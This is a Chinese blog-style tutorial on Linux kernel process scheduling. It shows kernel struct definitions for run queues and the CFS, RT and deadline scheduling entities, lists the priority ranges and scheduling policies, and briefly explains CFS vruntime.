<h2 id="就绪队列结构体"><a href="#就绪队列结构体" class="headerlink" title="就绪队列结构体"></a>就绪队列结构体</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span> &#123;</span></span><br><span class="line">	<span class="comment">/* runqueue lock: */</span></span><br><span class="line">	<span class="type">raw_spinlock_t</span>		lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * nr_running and cpu_load should be in the same cacheline because</span></span><br><span class="line"><span class="comment">	 * remote CPUs use both these fields when doing load calculation.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_running;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_numa_running;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_preferred_running;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		numa_migrate_on;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NO_HZ_COMMON</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		last_load_update_tick;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		last_blocked_load_update_tick;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		has_blocked_load;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SMP */</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nohz_tick_stopped;</span><br><span class="line">	<span class="type">atomic_t</span> nohz_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NO_HZ_COMMON */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_load_updates;</span><br><span class="line">	u64			nr_switches;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UCLAMP_TASK</span></span><br><span class="line">	<span class="comment">/* Utilization clamp values based on CPU&#x27;s RUNNABLE tasks */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uclamp_rq</span>	<span class="title">uclamp</span>[<span class="title">UCLAMP_CNT</span>] ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		uclamp_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UCLAMP_FLAG_IDLE 0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span>		<span class="title">cfs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rt_rq</span>		<span class="title">rt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dl_rq</span>		<span class="title">dl</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAIR_GROUP_SCHED</span></span><br><span class="line">	<span class="comment">/* list of leaf cfs_rq on this CPU: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">leaf_cfs_rq_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	*<span class="title">tmp_alone_branch</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FAIR_GROUP_SCHED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is part of a global counter where only the total sum</span></span><br><span class="line"><span class="comment">	 * over all CPUs matters. A task can increase this counter on</span></span><br><span class="line"><span class="comment">	 * one CPU and if it got migrated afterwards it may decrease</span></span><br><span class="line"><span class="comment">	 * it on another CPU. Always updated under the runqueue lock:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_uninterruptible;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> __<span class="title">rcu</span>	*<span class="title">curr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">idle</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">stop</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		next_balance;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>	*<span class="title">prev_mm</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		clock_update_flags;</span><br><span class="line">	u64			clock;</span><br><span class="line">	<span class="comment">/* Ensure that all clocks are in the same cache line */</span></span><br><span class="line">	u64			clock_task ____cacheline_aligned;</span><br><span class="line">	u64			clock_pelt;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		lost_idle_time;</span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_t</span>		nr_iowait;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMBARRIER</span></span><br><span class="line">	<span class="type">int</span> membarrier_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">root_domain</span>		*<span class="title">rd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_domain</span> __<span class="title">rcu</span>	*<span class="title">sd</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		cpu_capacity;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		cpu_capacity_orig;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span>	*<span class="title">balance_callback</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>		idle_balance;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		misfit_task_load;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* For active balancing */</span></span><br><span class="line">	<span class="type">int</span>			active_balance;</span><br><span class="line">	<span class="type">int</span>			push_cpu;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cpu_stop_work</span>	<span class="title">active_balance_work</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* CPU of this runqueue: */</span></span><br><span class="line">	<span class="type">int</span>			cpu;</span><br><span class="line">	<span class="type">int</span>			online;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cfs_tasks</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_avg</span>	<span class="title">avg_rt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_avg</span>	<span class="title">avg_dl</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HAVE_SCHED_AVG_IRQ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_avg</span>	<span class="title">avg_irq</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	u64			idle_stamp;</span><br><span class="line">	u64			avg_idle;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This is used to determine avg_idle&#x27;s max value */</span></span><br><span class="line">	u64			max_idle_balance_cost;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_IRQ_TIME_ACCOUNTING</span></span><br><span class="line">	u64			prev_irq_time;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PARAVIRT</span></span><br><span class="line">	u64			prev_steal_time;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PARAVIRT_TIME_ACCOUNTING</span></span><br><span class="line">	u64			prev_steal_time_rq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* calc_load related fields */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		calc_load_update;</span><br><span class="line">	<span class="type">long</span>			calc_load_active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SCHED_HRTICK</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="type">int</span>			hrtick_csd_pending;</span><br><span class="line">	<span class="type">call_single_data_t</span>	hrtick_csd;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span>		<span class="title">hrtick_timer</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SCHEDSTATS</span></span><br><span class="line">	<span class="comment">/* latency stats */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_info</span>	<span class="title">rq_sched_info</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>	rq_cpu_time;</span><br><span class="line">	<span class="comment">/* could above be rq-&gt;cfs_rq.exec_clock + rq-&gt;rt_rq.rt_runtime ? */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* sys_sched_yield() stats */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		yld_count;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* schedule() stats */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sched_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sched_goidle;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* try_to_wake_up() stats */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		ttwu_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		ttwu_local;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span>	<span class="title">wake_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CPU_IDLE</span></span><br><span class="line">	<span class="comment">/* Must be inspected within a rcu lock section */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cpuidle_state</span>	*<span class="title">idle_state</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>task_struct结构体中采用三个成员表示进程的优先级：prio 和 normal_prio（动态优先级）、static_prio（静态优先级）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_USER_RT_PRIO 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_RT_PRIO     MAX_USER_RT_PRIO</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PRIO (MAX_RT_PRIO + NICE_WIDTH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_PRIO (MAX_RT_PRIO + NICE_WIDTH / 2)</span></span><br></pre></td></tr></table></figure></div>

<p>实时进程优先级从 <code>0 ~ MAX_USER_RT_PRIO-1(99)</code>，普通进程优先级从 <code>100 ~ MAX_RT_PRIO-1(139) </code></p>
<h2 id="内核调度策略"><a href="#内核调度策略" class="headerlink" title="内核调度策略"></a>内核调度策略</h2><p>Linux内核提供一些调度策略供用户应用程序来选择调度器。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_NORMAL 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_FIFO 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_RR 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_BATCH 3</span></span><br><span class="line"><span class="comment">/* SCHED_ISO: reserved but not implemented yet */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_IDLE 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHED_DEADLINE 6</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>SCHED_NORMAL：</strong>普通进程的调度策略，使task选择CFS调度器来调度运行</li>
<li><strong>SCHED_FIFO：</strong>实时进程的调度策略，先进先出调度，没有时间片，没有更高优先级的状态下，只有等待主动让出CPU（非抢占）</li>
<li><strong>SCHED_RR：</strong>实时进程的调度策略，采用时间片轮转，进程使用完时间片之后会进入优先级对应运行队列的尾部，把CPU让给同等优先级的其他进程</li>
<li><strong>SCHED_BATCH：</strong>普通进程的调度策略，批量处理，使task选择CFS调度器来调度运行</li>
<li><strong>SCHED_IDLE：</strong>普通进程的调度策略，使我们task以最低优先级选择CFS调度器来调度运行</li>
<li><strong>SCHED_DEADLINE：</strong>限期进程调度策略，使我们task选择Deadline调度器来调度运行</li>
</ul>
<blockquote>
<p>stop调度器和Deadline调度器，仅使用于内核，用户没有办法进行选择</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/ddqandcl.webp"
                      alt="ddqandcl"
                ></p>
<h2 id="调度实体"><a href="#调度实体" class="headerlink" title="调度实体"></a>调度实体</h2><p>调度器不限于调度进程, 还可以调度更大的实体, 比如实现组调度: 可用的CPUI时间首先在一半的进程组(比如, 所有进程按照所有者分组)之间分配, 接下来分配的时间再在组内进行二次分配。这种一般性要求调度器不直接操作进程, 而是处理可调度实体, 因此需要一个通用的数据结构描述这个调度实体,即seched_entity结构, 其实际上就代表了一个调度对象，可以为一个进程，也可以为一个进程组。</p>
<p>linux中针对当前可调度的实时和非实时进程, 定义了类型为seched_entity的3个调度实体</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/ddst.webp"
                      alt="ddst"
                ></p>
<h3 id="CFS调度实体-sched-entity"><a href="#CFS调度实体-sched-entity" class="headerlink" title="CFS调度实体 sched_entity"></a>CFS调度实体 sched_entity</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先需要注意的是，调度实体可能是进程和调度组两种，因此结构体中会同时包含这两类实体相关的数据。 </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> &#123;</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  load 表示当前调度实体的权重，这个权重决定了一个调度实体的运行优先级，对进程实体而言，</span></span><br><span class="line"><span class="comment">    *  它是由静态优先级计算得到，对应调度组而言，是组内各实体的 load 之和。</span></span><br><span class="line"><span class="comment">    *  load 和 cpu_load 两个名字取得是有歧义的，虽然都是 load，但是 cpu_load 却是表示负载</span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">load_weight</span>      <span class="title">load</span>;</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  红黑树的数据节点，使用该 rb_node 将当前节点挂到红黑树上面，还是内核中的老套路，</span></span><br><span class="line"><span class="comment">    *  将 rb_node 嵌入 sched_entity 结构，在操作节点时，可以通过 rb_node 反向获取到其父结构。</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>          <span class="title">run_node</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  链表节点，被链接到 percpu 的 rq-&gt;cfs_tasks 上，</span></span><br><span class="line"><span class="comment">    *  在做 CPU 之间的负载均衡时，</span></span><br><span class="line"><span class="comment">    *  就会从该链表上选出 group_node 节点作为迁移进程。</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">group_node</span>;</span></span><br><span class="line">    <span class="comment">// 标志位，代表当前调度实体是否在就绪队列上</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>            on_rq;</span><br><span class="line">    <span class="comment">// 当前实体上次被调度执行的时间</span></span><br><span class="line">    u64             exec_start;</span><br><span class="line">    <span class="comment">// 当前实体总执行时间</span></span><br><span class="line">    u64             sum_exec_runtime;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  截止到上次统计，进程执行的时间，通常，</span></span><br><span class="line"><span class="comment">    *  通过 sum_exec_runtime - prev_sum_exec_runtime 来统计进程本次在 CPU 上执行了多长时间，</span></span><br><span class="line"><span class="comment">    *  以执行某些时间相关的操作 </span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    u64             prev_sum_exec_runtime;</span><br><span class="line">    <span class="comment">// 当前实体的虚拟时间，调度器就是通过调度实体的虚拟时间进行调度，在选择下一个待执行实体时总是选择虚拟时间最小的。</span></span><br><span class="line">    u64             vruntime;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  实体执行迁移的次数，在多核系统中，CPU 之间会经常性地执行负载均衡操作，</span></span><br><span class="line"><span class="comment">    *  因此调度实体很可能因为负载均衡而迁移到其它 CPU 的就绪队列上。</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    u64             nr_migrations;</span><br><span class="line">    <span class="comment">// 进程的属性统计，需要内核配置 CONFIG_SCHEDSTATS，其统计信息包含睡眠统计、等待延迟统计、CPU迁移统计、唤醒统计等。 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_statistics</span>     <span class="title">statistics</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAIR_GROUP_SCHED</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  由于调度实体可能是调度组，调度组中存在嵌套的调度实体，</span></span><br><span class="line"><span class="comment">    *  这个标志表示当前实体处于调度组中的深度，当不属于调度组时， depth 为 0.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span>             depth;</span><br><span class="line">    <span class="comment">// 指向父级调度实体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span>     *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="comment">// 当前调度实体属于的 cfs_rq.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span>           *<span class="title">cfs_rq</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  如果当前调度实体是一个调度组，那么它将拥有自己的 cfs_rq，属于该组内的所有调度实体在该 cfs_rq 上排列，</span></span><br><span class="line"><span class="comment">    *  而且当前 se 也是组内所有调度实体的 parent，子 se 存在一个指针指向 parent，</span></span><br><span class="line"><span class="comment">    *  而父级与子 se 的联系并不直接，而是通过访问 cfs_rq 来找到对应的子 se。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span>           *<span class="title">my_q</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  在多核系统中，需要记录 CPU 的负载，其统计方式精确到每一个调度实体，</span></span><br><span class="line"><span class="comment">    *  而这里的 avg 成员就是用来记录当前实体对于 CPU 的负载贡献。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_avg</span>        <span class="title">avg</span> ____<span class="title">cacheline_aligned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="RT调度实体-sched-rt-entity"><a href="#RT调度实体-sched-rt-entity" class="headerlink" title="RT调度实体 sched_rt_entity"></a>RT调度实体 sched_rt_entity</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">run_list</span>;</span>  <span class="comment">// 用于加入到优先级队列中</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			timeout; <span class="comment">// 设置时间超时</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			watchdog_stamp; <span class="comment">// 用于 记录 jiffies 的值</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			time_slice; <span class="comment">//  表示 时间片</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>			on_rq; <span class="comment">// </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>			on_list;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span>		*<span class="title">back</span>;</span> <span class="comment">// 用于由上到下连接 &quot; 实时调度实体 &quot; </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RT_GROUP_SCHED</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span>		*<span class="title">parent</span>;</span> <span class="comment">// 指向父类 &quot; 实时调度实体 &quot; </span></span><br><span class="line">	<span class="comment">/* rq on which this entity is (to be) queued: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rt_rq</span>			*<span class="title">rt_rq</span>;</span> <span class="comment">// 表示 &quot;实时调度实体&quot; 所属的 &quot;实时运行队列 &quot;</span></span><br><span class="line">	<span class="comment">/* rq &quot;owned&quot; by this entity/group: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rt_rq</span>			*<span class="title">my_q</span>;</span> <span class="comment">// 表示 &quot;实时调度实体&quot; 所拥有的 &quot;实时运行队列&quot; , 用于管理 &quot; 子任务 &quot; </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<h3 id="DL调度实体-sched-dl-entity"><a href="#DL调度实体-sched-dl-entity" class="headerlink" title="DL调度实体 sched_dl_entity"></a>DL调度实体 sched_dl_entity</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_dl_entity</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>			<span class="title">rb_node</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Original scheduling parameters. Copied here from sched_attr</span></span><br><span class="line"><span class="comment">	 * during sched_setattr(), they will remain the same until</span></span><br><span class="line"><span class="comment">	 * the next sched_setattr().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u64				dl_runtime;	<span class="comment">/* Maximum runtime for each instance	*/</span></span><br><span class="line">	u64				dl_deadline;	<span class="comment">/* Relative deadline of each instance	*/</span></span><br><span class="line">	u64				dl_period;	<span class="comment">/* Separation of two instances (period) */</span></span><br><span class="line">	u64				dl_bw;		<span class="comment">/* dl_runtime / dl_period		*/</span></span><br><span class="line">	u64				dl_density;	<span class="comment">/* dl_runtime / dl_deadline		*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Actual scheduling parameters. Initialized with the values above,</span></span><br><span class="line"><span class="comment">	 * they are continuously updated during task execution. Note that</span></span><br><span class="line"><span class="comment">	 * the remaining runtime could be &lt; 0 in case we are in overrun.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s64				runtime;	<span class="comment">/* Remaining runtime for this instance	*/</span></span><br><span class="line">	u64				deadline;	<span class="comment">/* Absolute deadline for this instance	*/</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			flags;		<span class="comment">/* Specifying the scheduler behaviour	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Some bool flags:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * @dl_throttled tells if we exhausted the runtime. If so, the</span></span><br><span class="line"><span class="comment">	 * task has to wait for a replenishment to be performed at the</span></span><br><span class="line"><span class="comment">	 * next firing of dl_timer.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * @dl_boosted tells if we are boosted due to DI. If so we are</span></span><br><span class="line"><span class="comment">	 * outside bandwidth enforcement mechanism (but only until we</span></span><br><span class="line"><span class="comment">	 * exit the critical section);</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * @dl_yielded tells if task gave up the CPU before consuming</span></span><br><span class="line"><span class="comment">	 * all its available runtime during the last job.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * @dl_non_contending tells if the task is inactive while still</span></span><br><span class="line"><span class="comment">	 * contributing to the active utilization. In other words, it</span></span><br><span class="line"><span class="comment">	 * indicates if the inactive timer has been armed and its handler</span></span><br><span class="line"><span class="comment">	 * has not been executed yet. This flag is useful to avoid race</span></span><br><span class="line"><span class="comment">	 * conditions between the inactive timer handler and the wakeup</span></span><br><span class="line"><span class="comment">	 * code.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * @dl_overrun tells if the task asked to be informed about runtime</span></span><br><span class="line"><span class="comment">	 * overruns.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			dl_throttled      : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			dl_boosted        : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			dl_yielded        : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			dl_non_contending : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			dl_overrun	  : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Bandwidth enforcement timer. Each -deadline task has its</span></span><br><span class="line"><span class="comment">	 * own bandwidth to be enforced, thus we need one timer per task.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span>			<span class="title">dl_timer</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Inactive timer, responsible for decreasing the active utilization</span></span><br><span class="line"><span class="comment">	 * at the &quot;0-lag time&quot;. When a -deadline task blocks, it contributes</span></span><br><span class="line"><span class="comment">	 * to GRUB&#x27;s active utilization until the &quot;0-lag time&quot;, hence a</span></span><br><span class="line"><span class="comment">	 * timer is needed to decrease the active utilization at the correct</span></span><br><span class="line"><span class="comment">	 * time.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> <span class="title">inactive_timer</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="CFS调度类fair-sched-class"><a href="#CFS调度类fair-sched-class" class="headerlink" title="CFS调度类fair_sched_class"></a>CFS调度类fair_sched_class</h2><p>完全公平调度算法体现在对待每个进程都是公平的，让每个进程都运行一段相同的时间片，这就是基于时间片轮询调度算法。CFS定义一种新调度模型，它给cfs_rq（cfs的run queue）中的每一个进程都设置一个虚拟时钟 - virtual  runtime（vruntime），如果一个进程得以执行，随着执行时间的不断增长，其vruntime也不断增大，没有得到执行的进程vruntime将保持不变。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span> <span class="comment">// 表示该进程所属的调度器类</span></span><br></pre></td></tr></table></figure></div>

